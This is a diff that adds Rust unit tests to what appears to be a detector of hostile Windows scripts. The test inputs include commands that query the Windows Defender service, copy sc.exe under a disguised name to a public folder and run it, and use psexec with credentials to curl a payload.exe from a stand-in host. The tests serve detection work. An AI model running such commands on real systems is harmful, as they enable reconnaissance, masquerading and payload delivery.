@@ -4520,6 +4520,48 @@ C:\Users\Public\nb.tmp -a target
     }
 
     #[test]
+    fn sc_query_emits_enumeration_trait() {
+        let report = analyze(br#"sc query WinDefend"#, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "sc-query" && command == "sc query WinDefend"
+            )),
+            "sc query enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_sc_alias_query_emits_enumeration_trait() {
+        let script = br#"copy C:\Windows\System32\sc.exe C:\Users\Public\sc.tmp
+C:\Users\Public\sc.tmp query state= all
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\sc.tmp"#)
+            )),
+            "copied sc alias was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "sc-query" && command == "sc.exe query state= all"
+            )),
+            "copied sc query enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
